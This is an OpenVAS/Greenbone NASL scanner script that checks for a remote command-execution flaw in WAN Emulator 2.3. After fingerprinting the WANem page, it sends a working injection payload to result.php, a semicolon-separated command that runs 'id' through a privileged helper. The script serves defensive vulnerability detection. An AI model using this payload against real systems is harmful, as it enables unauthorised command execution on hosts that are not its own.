if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103561" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "WAN Emulator Remote Command Execution Vulnerabilities" );
	script_xref( name: "URL", value: "http://itsecuritysolutions.org/2012-08-12-WANem-v2.3-multiple-vulnerabilities/" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-09-10 09:49:21 +0200 (Mon, 10 Sep 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "WAN Emulator is prone to a remote command-execution vulnerability because
  it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting these issues could allow an attacker to execute arbitrary commands
  within the context of the affected application." );
	script_tag( name: "affected", value: "WAN Emulator 2.3 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/WANem", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/title.html";
	buf = http_get_cache( item: url, port: port );
	if(ContainsString( buf, "<TITLE>Welcome to WANem" ) || ContainsString( buf, "Wide Area Network Emulator" )){
		url = dir + "/result.php?pc=127.0.0.1;/UNIONFS/home/perc/dosu%20id%26";
		if(http_vuln_check( port: port, url: url, pattern: "uid=[0-9]+.*gid=[0-9]+" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

